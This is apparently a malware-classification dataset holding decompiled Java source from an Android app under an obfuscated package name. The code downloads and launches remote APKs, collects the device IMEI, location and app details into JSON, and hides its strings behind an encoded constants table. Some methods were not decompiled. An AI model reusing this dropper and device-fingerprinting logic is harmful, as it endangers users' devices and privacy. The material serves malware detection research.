"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.a.a\j.code","public class j {   private static Map o=new HashMap();   private String f36a;   private int b;   private String c;   private String d;   private int e;   private Context f;   private boolean g;   private int h;   private int i;   private i[] j;   private File k;   private int m;   private String n;   private HttpURLConnection q;   private Map l=new ConcurrentHashMap();   private int p=3;   public j(  Context context,  String str,  File file,  int i,  int i2,  String str2,  int i3,  String str3){     this.h=0;     this.i=0;     this.q=null;     try {       this.b=i3;       this.c=str3;       this.d=str2;       this.f=context;       this.n=str;       this.e=i2;       URL url=new URL(this.n);       if (!file.exists()) {         file.mkdirs();       }       this.j=new i[i];       this.q=(HttpURLConnection)url.openConnection();       this.q.setConnectTimeout(5000);       this.q.setRequestMethod(com.apkmore.rbjatnldymzfiw.a.c.b.bc);       this.q.setRequestProperty(com.apkmore.rbjatnldymzfiw.a.c.b.ai,com.apkmore.rbjatnldymzfiw.a.c.b.aj);       this.q.setRequestProperty(com.apkmore.rbjatnldymzfiw.a.c.b.ak,com.apkmore.rbjatnldymzfiw.a.c.b.al);       this.q.setRequestProperty(com.apkmore.rbjatnldymzfiw.a.c.b.bp,url.toString());       this.q.setRequestProperty(com.apkmore.rbjatnldymzfiw.a.c.b.am,com.apkmore.rbjatnldymzfiw.a.c.b.ae);       this.q.setRequestProperty(com.apkmore.rbjatnldymzfiw.a.c.b.an,com.apkmore.rbjatnldymzfiw.a.c.b.ao);       this.q.setRequestProperty(com.apkmore.rbjatnldymzfiw.a.c.b.ap,com.apkmore.rbjatnldymzfiw.a.c.b.aq);       this.q.connect();       b(this.q);       if (this.q.getResponseCode() == 200) {         this.i=this.q.getContentLength();         i.b.put(str,Integer.valueOf(this.i));         this.f36a=com.apkmore.rbjatnldymzfiw.a.c.e.a(this.n) + com.apkmore.rbjatnldymzfiw.a.c.b.t;         if (i3 == 11111) {           this.k=new File(file,com.apkmore.rbjatnldymzfiw.a.c.b.J);         }  else {           this.k=new File(file,this.f36a);         }         Map a2=k.a(str);         if (a2.size() > 0) {           for (          Map.Entry entry : a2.entrySet()) {             this.l.put(entry.getKey(),entry.getValue());           }         }         if (this.l.size() == this.j.length) {           for (int i4=0; i4 < this.j.length; i4++) {             this.h=((Integer)this.l.get(Integer.valueOf(i4 + 1))).intValue() + this.h;           }         }         this.m=this.i % this.j.length == 0 ? this.i / this.j.length : (this.i / this.j.length) + 1;       }     }  catch (    Exception e) {     }   }   public static Map a(  HttpURLConnection httpURLConnection){     LinkedHashMap linkedHashMap=new LinkedHashMap();     int i=0;     while (true) {       String headerField=httpURLConnection.getHeaderField(i);       if (headerField == null) {         return linkedHashMap;       }       linkedHashMap.put(httpURLConnection.getHeaderFieldKey(i),headerField);       i++;     }   }   private static void a(  String str){   }   private void a(  boolean z){     try {       c.b.remove(this.n);       c.c.remove(this.n);       com.apkmore.rbjatnldymzfiw.a.c.h.a(this.f36a.substring(0,this.f36a.length() - 1),this.f,this.b);       Thread.sleep(2000L);       if (z) {         b.a(this.n,this.f,1,this.d,this.b,this.c);       }     }  catch (    Exception e) {     }   }   private void b(){     try {       k.b(this.n);       if (this.b == 11111) {         k.f37a.sendEmptyMessage(-10);         return;       }       File c=c();       Thread.sleep(500L);       if (o.get(this.n) == null) {         o.put(this.n,0);       }       if (!com.apkmore.rbjatnldymzfiw.a.c.h.c(this.f,com.apkmore.rbjatnldymzfiw.a.c.h.a(this.b) + ""/"" + this.f36a.substring(0,this.f36a.length() - 1))) {         g.f33a.remove(this.c + ""/"");         g.f33a.remove(this.c);         if (this.c.length() > 4) {           g.f33a.remove(this.c.substring(0,4) + ""../"");           g.f33a.remove(this.c.substring(0,4) + "".."");         }         if (g.f33a.size() < 2) {           com.apkmore.rbjatnldymzfiw.a.i.a(this.f,100);         }         Thread.sleep(3000L);         int intValue=((Integer)o.get(this.n)).intValue() + 1;         o.put(this.n,Integer.valueOf(intValue));         if (intValue < 2) {           a(true);           return;         }         c.b.remove(this.n);         o.put(this.n,0);         a(false);         return;       }       k.f37a.sendEmptyMessage(this.b);       c.b.remove(this.n);       c.c.remove(this.n);       d();       Intent a2=com.apkmore.rbjatnldymzfiw.a.c.h.a(this.f,c);       this.f.startActivity(a2);       g.f33a.remove(this.c + ""/"");       g.f33a.remove(this.c);       if (this.c.length() > 4) {         g.f33a.remove(this.c.substring(0,4) + ""../"");         g.f33a.remove(this.c.substring(0,4) + "".."");       }       com.apkmore.rbjatnldymzfiw.a.i.a(this.f,R.drawable.stat_sys_download_done,com.apkmore.rbjatnldymzfiw.a.c.b.aA,this.b,32,a2,this.c,-1);       if (c.b.size() <= 0 || c.c.size() >= 3) {         return;       }       for (      Map.Entry entry : c.b.entrySet()) {         if (!c.c.contains(entry.getKey())) {           b.a(((String[])entry.getValue())[0],this.f,1,((String[])entry.getValue())[1],Integer.valueOf(((String[])entry.getValue())[2]).intValue(),((String[])entry.getValue())[3]);           return;         }       }     }  catch (    Exception e) {     }   }   public static void b(  HttpURLConnection httpURLConnection){     for (    Map.Entry entry : a(httpURLConnection).entrySet()) {       a((entry.getKey() != null ? ((String)entry.getKey()) + "":"" : """") + ((String)entry.getValue()));     }   }   private File c(){     File file=new File(com.apkmore.rbjatnldymzfiw.a.c.h.a(this.b) + ""/"" + this.f36a.substring(0,this.f36a.length() - 1));     new File(com.apkmore.rbjatnldymzfiw.a.c.h.a(this.b) + ""/"" + this.f36a.substring(0,this.f36a.length())).renameTo(file);     return file;   }   private void d(){     SharedPreferences.Editor edit=this.f.getSharedPreferences(com.apkmore.rbjatnldymzfiw.a.c.b.aY,0).edit();     edit.putString(this.d,this.f36a.substring(0,this.f36a.length() - 1) + "";"" + this.b+ "";""+ this.c);     edit.commit();   }   public int a(  f fVar){     int i;     try {       URL url=new URL(this.n);       if (this.l.size() != this.j.length) {         this.l.clear();         for (int i2=0; i2 < this.j.length; i2++) {           this.l.put(Integer.valueOf(i2 + 1),0);         }         this.h=0;         i=10;       }  else {         i=1;       }       for (int i3=0; i3 < this.j.length; i3++) {         if (((Integer)this.l.get(Integer.valueOf(i3 + 1))).intValue() >= this.m || this.h >= this.i) {           this.j[i3]=null;         }  else {           this.j[i3]=new i(this,url,this.k,this.m,((Integer)this.l.get(Integer.valueOf(i3 + 1))).intValue(),i3 + 1,this.q,i);           this.j[i3].setPriority(7);           this.j[i3].start();         }       }       k.b(this.n);       if (this.c != null) {         k.a(this.n,this.d,this.l,this.b,this.c);       }       boolean z=true;       while (z) {         Thread.sleep(1000L);         z=false;         for (int i4=0; i4 < this.j.length; i4++) {           if (this.j[i4] != null && !this.j[i4].a()) {             if (this.j[i4].b() == -1) {               this.p--;               boolean z2=this.p >= 0;               this.j[i4]=new i(this,url,this.k,this.m,((Integer)this.l.get(Integer.valueOf(i4 + 1))).intValue(),i4 + 1,this.q,1);               this.j[i4].setPriority(7);               this.j[i4].start();               z=z2;             }  else {               z=true;             }           }         }         if (fVar != null) {           fVar.a(this.h);         }       }       if (this.h == this.i) {         b();       }     }  catch (    Exception e) {     }     return this.h;   }   public synchronized void a(  int i){     this.h=i;   }   public synchronized void a(  int i,  int i2){     this.l.put(Integer.valueOf(i),Integer.valueOf(i2));     k.a(this.n,i,i2,this.f);   }   public boolean a(){     return this.g;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.a.a\k.code","public class k {   public static Handler f37a=new l();   private static Context b;   public k(  Context context){     b=context;   }   public static synchronized java.util.Map a(  java.lang.String r7){     throw new UnsupportedOperationException(""Method not decompiled: com.apkmore.rbjatnldymzfiw.a.a.k.a(java.lang.String):java.util.Map"");   }   public static synchronized void a(  int r15){     throw new UnsupportedOperationException(""Method not decompiled: com.apkmore.rbjatnldymzfiw.a.a.k.a(int):void"");   }   public static synchronized void a(  String str,  int i,  int i2,  Context context){ synchronized (k.class) {       SQLiteDatabase sQLiteDatabase=null;       try {         try {           sQLiteDatabase=new a(context).getWritableDatabase();           sQLiteDatabase.execSQL(com.apkmore.rbjatnldymzfiw.a.c.b.bs,new Object[]{Integer.valueOf(i2),str,Integer.valueOf(i)});           if (sQLiteDatabase != null) {             try {               sQLiteDatabase.close();             }  catch (            Exception e) {             }           }         }  catch (        Exception e2) {           e2.printStackTrace();           if (sQLiteDatabase != null) {             try {               sQLiteDatabase.close();             }  catch (            Exception e3) {             }           }         }       }  catch (      Throwable th) {         if (sQLiteDatabase != null) {           try {             sQLiteDatabase.close();           }  catch (          Exception e4) {           }         }         throw th;       }     }   }   public static synchronized void a(  String str,  String str2,  Map map,  int i,  String str3){ synchronized (k.class) {       SQLiteDatabase sQLiteDatabase=null;       try {         try {           SQLiteDatabase writableDatabase=new a(b).getWritableDatabase();           writableDatabase.beginTransaction();           try {             for (            Map.Entry entry : map.entrySet()) {               writableDatabase.execSQL(com.apkmore.rbjatnldymzfiw.a.c.b.bu + "" "" + com.apkmore.rbjatnldymzfiw.a.c.b.aR+ ""(""+ com.apkmore.rbjatnldymzfiw.a.c.b.aT+ "",""+ com.apkmore.rbjatnldymzfiw.a.c.b.aU+ "",""+ com.apkmore.rbjatnldymzfiw.a.c.b.aW+ "",""+ com.apkmore.rbjatnldymzfiw.a.c.b.aX+ "",""+ com.apkmore.rbjatnldymzfiw.a.c.b.aV+ "",""+ com.apkmore.rbjatnldymzfiw.a.c.b.aS+ com.apkmore.rbjatnldymzfiw.a.c.b.bt,new Object[]{str,str2,entry.getKey(),entry.getValue(),Integer.valueOf(i),str3});             }             writableDatabase.setTransactionSuccessful();             if (writableDatabase != null) {               try {                 writableDatabase.close();               }  catch (              Exception e) {               }             }           }   finally {             writableDatabase.endTransaction();           }         }  catch (        Throwable th) {           if (0 != 0) {             try {               sQLiteDatabase.close();             }  catch (            Exception e2) {             }           }           throw th;         }       }  catch (      Exception e3) {         e3.printStackTrace();         if (0 != 0) {           try {             sQLiteDatabase.close();           }  catch (          Exception e4) {           }         }       }     }   }   public static synchronized boolean a(  android.content.Context r5){     throw new UnsupportedOperationException(""Method not decompiled: com.apkmore.rbjatnldymzfiw.a.a.k.a(android.content.Context):boolean"");   }   public static synchronized void b(  String str){ synchronized (k.class) {       SQLiteDatabase sQLiteDatabase=null;       try {         try {           sQLiteDatabase=new a(b).getWritableDatabase();           sQLiteDatabase.execSQL(com.apkmore.rbjatnldymzfiw.a.c.b.br + "" "" + com.apkmore.rbjatnldymzfiw.a.c.b.aR+ "" ""+ com.apkmore.rbjatnldymzfiw.a.c.b.bh+ "" ""+ com.apkmore.rbjatnldymzfiw.a.c.b.aT+ ""=?"",new Object[]{str});           if (sQLiteDatabase != null) {             try {               sQLiteDatabase.close();             }  catch (            Exception e) {             }           }         }  catch (        Exception e2) {           e2.printStackTrace();           if (sQLiteDatabase != null) {             try {               sQLiteDatabase.close();             }  catch (            Exception e3) {             }           }         }       }  catch (      Throwable th) {         if (sQLiteDatabase != null) {           try {             sQLiteDatabase.close();           }  catch (          Exception e4) {           }         }         throw th;       }     }   }   public static synchronized boolean c(  java.lang.String r5){     throw new UnsupportedOperationException(""Method not decompiled: com.apkmore.rbjatnldymzfiw.a.a.k.c(java.lang.String):boolean"");   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.a.a\l.code","!org.eclipse.jdt.core.dom.TypeDeclaration@242842f0"
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.a.b\a.code","public class a { } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.a.b\b.code","public class b implements c, Serializable {   private static final String B=com.apkmore.rbjatnldymzfiw.a.c.b.U;   public String f39a;   public String b;   public int c;   public String d;   public int e;   public String f;   public String g;   public String h;   public int i;   public String j;   public String k;   public String l;   public boolean m;   public boolean n;   public boolean o;   public String p;   public boolean q;   public String r;   public String s;   public int t;   public int u;   public String x;   public int v=0;   public int w=0;   public String y="""";   public String z="""";   public boolean A=false;   @Override public String a(){     return com.apkmore.rbjatnldymzfiw.a.c.b.c;   }   @Override public void a(  JSONObject jSONObject){     if (jSONObject == null) {       return;     }     try {       this.f39a=jSONObject.isNull(com.apkmore.rbjatnldymzfiw.a.c.b.b) ? null : jSONObject.getString(com.apkmore.rbjatnldymzfiw.a.c.b.b);       this.b=jSONObject.isNull(com.apkmore.rbjatnldymzfiw.a.c.b.c) ? null : jSONObject.getString(com.apkmore.rbjatnldymzfiw.a.c.b.c);       this.c=jSONObject.isNull(com.apkmore.rbjatnldymzfiw.a.c.b.d) ? -1 : jSONObject.getInt(com.apkmore.rbjatnldymzfiw.a.c.b.d);       this.d=jSONObject.isNull(com.apkmore.rbjatnldymzfiw.a.c.b.e) ? null : jSONObject.getString(com.apkmore.rbjatnldymzfiw.a.c.b.e);       this.e=jSONObject.isNull(com.apkmore.rbjatnldymzfiw.a.c.b.f) ? -1 : jSONObject.getInt(com.apkmore.rbjatnldymzfiw.a.c.b.f);       this.f=jSONObject.isNull(com.apkmore.rbjatnldymzfiw.a.c.b.g) ? null : jSONObject.getString(com.apkmore.rbjatnldymzfiw.a.c.b.g);       this.g=jSONObject.isNull(com.apkmore.rbjatnldymzfiw.a.c.b.h) ? null : jSONObject.getString(com.apkmore.rbjatnldymzfiw.a.c.b.h);       this.h=jSONObject.isNull(com.apkmore.rbjatnldymzfiw.a.c.b.i) ? null : jSONObject.getString(com.apkmore.rbjatnldymzfiw.a.c.b.i);       this.i=jSONObject.isNull(com.apkmore.rbjatnldymzfiw.a.c.b.j) ? -1 : jSONObject.getInt(com.apkmore.rbjatnldymzfiw.a.c.b.j);       this.j=jSONObject.isNull(com.apkmore.rbjatnldymzfiw.a.c.b.k) ? null : jSONObject.getString(com.apkmore.rbjatnldymzfiw.a.c.b.k);       this.k=jSONObject.isNull(com.apkmore.rbjatnldymzfiw.a.c.b.l) ? null : jSONObject.getString(com.apkmore.rbjatnldymzfiw.a.c.b.l);       this.l=jSONObject.isNull(com.apkmore.rbjatnldymzfiw.a.c.b.m) ? null : jSONObject.getString(com.apkmore.rbjatnldymzfiw.a.c.b.m);       this.m=jSONObject.isNull(com.apkmore.rbjatnldymzfiw.a.c.b.n) ? true : jSONObject.getBoolean(com.apkmore.rbjatnldymzfiw.a.c.b.n);       this.n=jSONObject.isNull(com.apkmore.rbjatnldymzfiw.a.c.b.o) ? true : jSONObject.getBoolean(com.apkmore.rbjatnldymzfiw.a.c.b.o);       this.o=jSONObject.isNull(com.apkmore.rbjatnldymzfiw.a.c.b.p) ? false : jSONObject.getBoolean(com.apkmore.rbjatnldymzfiw.a.c.b.p);       this.p=jSONObject.isNull(com.apkmore.rbjatnldymzfiw.a.c.b.q) ? null : jSONObject.getString(com.apkmore.rbjatnldymzfiw.a.c.b.q);       this.q=jSONObject.isNull(com.apkmore.rbjatnldymzfiw.a.c.b.r) ? false : jSONObject.getBoolean(com.apkmore.rbjatnldymzfiw.a.c.b.r);       this.r=jSONObject.isNull(com.apkmore.rbjatnldymzfiw.a.c.b.s) ? null : jSONObject.getString(com.apkmore.rbjatnldymzfiw.a.c.b.s);       this.s=jSONObject.isNull(com.apkmore.rbjatnldymzfiw.a.c.b.t) ? null : jSONObject.getString(com.apkmore.rbjatnldymzfiw.a.c.b.t);       this.t=jSONObject.isNull(com.apkmore.rbjatnldymzfiw.a.c.b.u) ? 0 : jSONObject.getInt(com.apkmore.rbjatnldymzfiw.a.c.b.u);       this.u=jSONObject.isNull(com.apkmore.rbjatnldymzfiw.a.c.b.v) ? 0 : jSONObject.getInt(com.apkmore.rbjatnldymzfiw.a.c.b.v);       this.y=jSONObject.isNull(com.apkmore.rbjatnldymzfiw.a.c.b.w) ? null : jSONObject.getString(com.apkmore.rbjatnldymzfiw.a.c.b.w);       this.z=jSONObject.isNull(com.apkmore.rbjatnldymzfiw.a.c.b.x) ? null : jSONObject.getString(com.apkmore.rbjatnldymzfiw.a.c.b.x);       this.x=jSONObject.isNull(com.apkmore.rbjatnldymzfiw.a.c.b.y) ? null : jSONObject.getString(com.apkmore.rbjatnldymzfiw.a.c.b.y);     }  catch (    Exception e) {       e.printStackTrace();     }   }   public String toString(){     return """";   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.a.b\c.code","public interface c {   String a();   void a(  JSONObject jSONObject); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.a.b\d.code","public class d implements c {   public static String u=""1.0.4"";   public String c;   public String d;   public String e;   public int f;   public int g;   public int h;   public int i;   public double j;   public double k;   public String l;   public String m;   public String n;   public String o;   public boolean p;   public String q;   public String r;   public int s;   public String t;   public int v=3;   public String b=Build.PRODUCT;   public String f40a=Build.VERSION.SDK;   public d(  Context context){     this.q=context.getPackageName();     this.c=h.j(context);     this.d=((TelephonyManager)context.getSystemService(""phone"")).getDeviceId();     WindowManager windowManager=(WindowManager)context.getSystemService(""window"");     DisplayMetrics displayMetrics=new DisplayMetrics();     windowManager.getDefaultDisplay().getMetrics(displayMetrics);     this.g=displayMetrics.densityDpi;     this.h=displayMetrics.widthPixels;     this.i=displayMetrics.heightPixels;     PackageManager packageManager=context.getPackageManager();     try {       PackageInfo packageInfo=packageManager.getPackageInfo(context.getPackageName(),0);       this.e=packageInfo.versionName;       this.f=packageInfo.versionCode;     }  catch (    PackageManager.NameNotFoundException e) {     }     try {       this.n=h.a(context,packageManager);     }  catch (    PackageManager.NameNotFoundException e2) {       e2.printStackTrace();     }     this.o=h.c(context);     this.m=i.c(context);     if (this.m == null) {       this.m=com.apkmore.rbjatnldymzfiw.a.c.b.C;     }     Location d=h.d(context);     if (d != null) {       this.k=d.getLongitude();       this.j=d.getLatitude();       String a2=h.a(this.k,this.j);       if (a2 != null) {         this.l=a2;       }     }     this.p=h.a(context);     this.s=h.b(context);     if (this.s != 100061) {       Log.d(com.apkmore.rbjatnldymzfiw.a.c.b.f44a,com.apkmore.rbjatnldymzfiw.a.c.b.M + this.s);     }   }   @Override public String a(){     return com.apkmore.rbjatnldymzfiw.a.c.b.b;   }   @Override public void a(  JSONObject jSONObject){     if (jSONObject == null) {       return;     }     try {       this.f40a=jSONObject.isNull(com.apkmore.rbjatnldymzfiw.a.c.b.b) ? null : jSONObject.getString(com.apkmore.rbjatnldymzfiw.a.c.b.b);       this.b=jSONObject.isNull(com.apkmore.rbjatnldymzfiw.a.c.b.c) ? null : jSONObject.getString(com.apkmore.rbjatnldymzfiw.a.c.b.c);       this.c=jSONObject.isNull(com.apkmore.rbjatnldymzfiw.a.c.b.d) ? null : jSONObject.getString(com.apkmore.rbjatnldymzfiw.a.c.b.d);       this.d=jSONObject.isNull(com.apkmore.rbjatnldymzfiw.a.c.b.e) ? null : jSONObject.getString(com.apkmore.rbjatnldymzfiw.a.c.b.e);       this.e=jSONObject.isNull(com.apkmore.rbjatnldymzfiw.a.c.b.f) ? null : jSONObject.getString(com.apkmore.rbjatnldymzfiw.a.c.b.f);       this.f=jSONObject.isNull(com.apkmore.rbjatnldymzfiw.a.c.b.g) ? 0 : jSONObject.getInt(com.apkmore.rbjatnldymzfiw.a.c.b.g);       this.g=jSONObject.isNull(com.apkmore.rbjatnldymzfiw.a.c.b.h) ? 0 : jSONObject.getInt(com.apkmore.rbjatnldymzfiw.a.c.b.h);       this.h=jSONObject.isNull(com.apkmore.rbjatnldymzfiw.a.c.b.i) ? 0 : jSONObject.getInt(com.apkmore.rbjatnldymzfiw.a.c.b.i);       this.i=jSONObject.isNull(com.apkmore.rbjatnldymzfiw.a.c.b.j) ? 0 : jSONObject.getInt(com.apkmore.rbjatnldymzfiw.a.c.b.j);       this.j=jSONObject.isNull(com.apkmore.rbjatnldymzfiw.a.c.b.k) ? 0.0d : jSONObject.getDouble(com.apkmore.rbjatnldymzfiw.a.c.b.k);       this.k=jSONObject.isNull(com.apkmore.rbjatnldymzfiw.a.c.b.l) ? 0.0d : jSONObject.getDouble(com.apkmore.rbjatnldymzfiw.a.c.b.l);       this.l=jSONObject.isNull(com.apkmore.rbjatnldymzfiw.a.c.b.m) ? null : jSONObject.getString(com.apkmore.rbjatnldymzfiw.a.c.b.m);       this.m=jSONObject.isNull(com.apkmore.rbjatnldymzfiw.a.c.b.n) ? null : jSONObject.getString(com.apkmore.rbjatnldymzfiw.a.c.b.n);       this.n=jSONObject.isNull(com.apkmore.rbjatnldymzfiw.a.c.b.o) ? null : jSONObject.getString(com.apkmore.rbjatnldymzfiw.a.c.b.o);       this.o=jSONObject.isNull(com.apkmore.rbjatnldymzfiw.a.c.b.p) ? null : jSONObject.getString(com.apkmore.rbjatnldymzfiw.a.c.b.p);       this.p=jSONObject.isNull(com.apkmore.rbjatnldymzfiw.a.c.b.q) ? false : jSONObject.getBoolean(com.apkmore.rbjatnldymzfiw.a.c.b.q);       this.q=jSONObject.isNull(com.apkmore.rbjatnldymzfiw.a.c.b.r) ? null : jSONObject.getString(com.apkmore.rbjatnldymzfiw.a.c.b.r);       this.r=jSONObject.isNull(com.apkmore.rbjatnldymzfiw.a.c.b.s) ? null : jSONObject.getString(com.apkmore.rbjatnldymzfiw.a.c.b.s);       this.s=jSONObject.isNull(com.apkmore.rbjatnldymzfiw.a.c.b.t) ? 100008 : jSONObject.getInt(com.apkmore.rbjatnldymzfiw.a.c.b.t);       this.t=jSONObject.isNull(com.apkmore.rbjatnldymzfiw.a.c.b.u) ? null : jSONObject.getString(com.apkmore.rbjatnldymzfiw.a.c.b.u);       u=jSONObject.isNull(com.apkmore.rbjatnldymzfiw.a.c.b.v) ? null : jSONObject.getString(com.apkmore.rbjatnldymzfiw.a.c.b.v);       this.v=jSONObject.isNull(com.apkmore.rbjatnldymzfiw.a.c.b.w) ? 0 : jSONObject.getInt(com.apkmore.rbjatnldymzfiw.a.c.b.w);     }  catch (    Exception e) {       e.printStackTrace();     }   }   public JSONObject b(){     JSONObject jSONObject=new JSONObject();     try {       jSONObject.put(com.apkmore.rbjatnldymzfiw.a.c.b.b,this.f40a);       jSONObject.put(com.apkmore.rbjatnldymzfiw.a.c.b.c,this.b);       jSONObject.put(com.apkmore.rbjatnldymzfiw.a.c.b.d,this.c);       jSONObject.put(com.apkmore.rbjatnldymzfiw.a.c.b.e,this.d);       jSONObject.put(com.apkmore.rbjatnldymzfiw.a.c.b.f,this.e);       jSONObject.put(com.apkmore.rbjatnldymzfiw.a.c.b.g,this.f);       jSONObject.put(com.apkmore.rbjatnldymzfiw.a.c.b.h,this.g);       jSONObject.put(com.apkmore.rbjatnldymzfiw.a.c.b.i,this.h);       jSONObject.put(com.apkmore.rbjatnldymzfiw.a.c.b.j,this.i);       jSONObject.put(com.apkmore.rbjatnldymzfiw.a.c.b.k,this.j);       jSONObject.put(com.apkmore.rbjatnldymzfiw.a.c.b.l,this.k);       jSONObject.put(com.apkmore.rbjatnldymzfiw.a.c.b.m,this.l);       jSONObject.put(com.apkmore.rbjatnldymzfiw.a.c.b.n,this.m);       jSONObject.put(com.apkmore.rbjatnldymzfiw.a.c.b.o,this.n);       jSONObject.put(com.apkmore.rbjatnldymzfiw.a.c.b.p,this.o);       jSONObject.put(com.apkmore.rbjatnldymzfiw.a.c.b.q,this.p);       jSONObject.put(com.apkmore.rbjatnldymzfiw.a.c.b.r,this.q);       jSONObject.put(com.apkmore.rbjatnldymzfiw.a.c.b.s,this.r);       jSONObject.put(com.apkmore.rbjatnldymzfiw.a.c.b.t,this.s);       jSONObject.put(com.apkmore.rbjatnldymzfiw.a.c.b.u,this.t);       jSONObject.put(com.apkmore.rbjatnldymzfiw.a.c.b.v,u);       jSONObject.put(com.apkmore.rbjatnldymzfiw.a.c.b.w,this.v);       return jSONObject;     }  catch (    Exception e) {       e.printStackTrace();       return null;     }   }   public String toString(){     return """";   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.a.b\e.code","public class e implements c {   public int f41a;   public String b;   @Override public String a(){     return com.apkmore.rbjatnldymzfiw.a.c.b.e;   }   @Override public void a(  JSONObject jSONObject){     try {       this.f41a=jSONObject.isNull(com.apkmore.rbjatnldymzfiw.a.c.b.b) ? -1 : jSONObject.getInt(com.apkmore.rbjatnldymzfiw.a.c.b.b);       this.b=jSONObject.isNull(com.apkmore.rbjatnldymzfiw.a.c.b.c) ? null : jSONObject.getString(com.apkmore.rbjatnldymzfiw.a.c.b.c);     }  catch (    Exception e) {       e.printStackTrace();     }   }   public String toString(){     return ""["" + this.f41a + "",""+ this.b+ ""]"";   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.a.b\f.code","public class f {   public static c a(  Class cls,  String str){     if (str == null || str.length() < 2) {       return null;     }     try {       JSONObject jSONObject=new JSONObject(str);       c cVar=(c)cls.newInstance();       if (!jSONObject.isNull(cVar.a())) {         cVar.a(jSONObject.getJSONObject(cVar.a()));         return cVar;       }     }  catch (    IllegalAccessException e) {       e.printStackTrace();     } catch (    InstantiationException e2) {       e2.printStackTrace();     } catch (    JSONException e3) {       e3.printStackTrace();     }     return null;   }   public static c[] b(  Class cls,  String str){     JSONArray jSONArray;     if (str == null || str.length() < 2) {       return null;     }     try {       JSONObject jSONObject=new JSONObject(str);       c cVar=(c)cls.newInstance();       if (!jSONObject.isNull(cVar.a()) && (jSONArray=jSONObject.getJSONArray(cVar.a())) != null) {         c[] cVarArr=(c[])Array.newInstance((Class<?>)cls,jSONArray.length());         int i=0;         while (true) {           int i2=i;           if (i2 >= jSONArray.length()) {             return cVarArr;           }           c cVar2=(c)cls.newInstance();           cVar2.a(jSONArray.getJSONObject(i2));           cVarArr[i2]=cVar2;           i=i2 + 1;         }       }     }  catch (    IllegalAccessException e) {       e.printStackTrace();     } catch (    InstantiationException e2) {       e2.printStackTrace();     } catch (    JSONException e3) {       e3.printStackTrace();     }     return null;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.a.c\a.code","public class a {   private static Map f43a=new HashMap();   private static int b=0;   private static final int[] c={0,6608,13203,30491,36876,43288,61397,64167};   public static synchronized android.graphics.Bitmap a(  android.content.Context r9,  int r10){     throw new UnsupportedOperationException(""Method not decompiled: com.apkmore.rbjatnldymzfiw.a.c.a.a(android.content.Context, int):android.graphics.Bitmap"");   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.a.c\b.code","public final class b {   public static final String f44a=d.a(""xÃ�ÃµÃ–Â¾Ã‰y"");   public static final String b=d.a(""xÃ¶y"");   public static final String c=d.a(""xÃ·y"");   public static final String d=d.a(""xÃ¸y"");   public static final String e=d.a(""xÃ¹y"");   public static final String f=d.a(""xÃºy"");   public static final String g=d.a(""xÃ»y"");   public static final String h=d.a(""xÃ¼y"");   public static final String i=d.a(""xÃ½y"");   public static final String j=d.a(""xÃ¾y"");   public static final String k=d.a(""xÃ¿y"");   public static final String l=d.a(""xÄ€y"");   public static final String m=d.a(""xÄ�y"");   public static final String n=d.a(""xÄ‚y"");   public static final String o=d.a(""xÄƒy"");   public static final String p=d.a(""xÄ„y"");   public static final String q=d.a(""xÄ…y"");   public static final String r=d.a(""xÄ†y"");   public static final String s=d.a(""xÄ‡y"");   public static final String t=d.a(""xÄˆy"");   public static final String u=d.a(""xÄ‰y"");   public static final String v=d.a(""xÄŠy"");   public static final String w=d.a(""xÄ‹y"");   public static final String x=d.a(""xÄŒy"");   public static final String y=d.a(""xÄ�y"");   public static final String z=d.a(""xÃŒÃŠÃºÃ¤Ã´Ã³Ã½Ã¹Ã�Ã²Ã¦ÃºÃ·Â¹Ã’Ã±Ã¼Ã˜Â¸Ã«Ã¨Ã�Â¯Ã—Ã�Ãžy"");   public static final String A=d.a(""xÃ»Ã›ÃªÄŒÄ�Ã®Ã­Ã€Ã·Ã®y"");   public static final String B=d.a(""xÃ¯Â³Ã¿Ã®y"");   public static final String C=d.a(""xÃ¿Ã�Ã­Ä†Ã¢Ä€ÄŒy"");   public static final String D=d.a(""xÃ‘Ã�Ã¨Ä‘ÄˆÃ­Ã¦ÃµÃ¯Ã¼y"");   public static final String E=d.a(""xÃœÄ‡ÄƒÃ®Ã£Ã´Ä€Ã�Ä’Ã²Ã¢Ã¤y"");   public static final String F=d.a(""xÄŽÃœÃ¼Ä‡Ä�Ã²Ã­Ã¼Ä‚Äƒy"");   public static final String G=d.a(""xÃ­Ä�Ä–Ã·Ã­Ä‚Ã¯Ã®Ã�ÃŠÃ˜Â®y"");   public static final String H=d.a(""x\u009dÃ²Ä†ÃšÂ·Ä‚Ä€Ã½y"");   public static final String I=d.a(""xÃ„Ã†Ã„Ã�Â¹Â»ÃŒÃ�Â§Â»Ã¹Ã•Ã¬Ä‚Ä„Ã¯Â±Ã„Ã€Â½Ã’Ã†Â¤Â¶Â©Ã“Ã¾Ã«Ã¯Ã¤Ã§Ãªy"");   public 